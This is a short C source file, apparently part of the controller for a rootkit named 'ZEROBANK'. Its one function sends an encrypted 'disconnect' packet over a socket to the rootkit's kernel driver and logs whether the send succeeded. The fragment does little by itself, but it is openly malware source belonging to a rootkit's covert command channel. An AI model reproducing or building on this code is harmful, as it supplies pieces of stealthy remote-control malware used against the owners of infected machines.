#include "server_globals.h"

BOOL rootkit_disconnect_from_driver(IN SOCKET sock, IN BYTE PacketType)
{
	ZEROBANK_PACKET_TYPE Type = { 0 };
	BOOL ret;
	int sendsize = 0;
	int getbytes = 0;

	Type.PacketType = PacketType;
	
	sendsize = send_packet_encrypted(sock, 2, (PZEROBANK_PACKET_TYPE)&Type, sizeof(ZEROBANK_PACKET_TYPE));

	if (sendsize > 0 && Type.PacketType != NULL)
	{
		printf("\r\n[+] __disconnect__ plugin send correctly");
		ret = TRUE;
	}
	else
	{
		printf("\r\n[!] __disconnect__ plugin error: %d",RtlGetLastWin32Error());
		ret = FALSE;
	}

	return ret;
}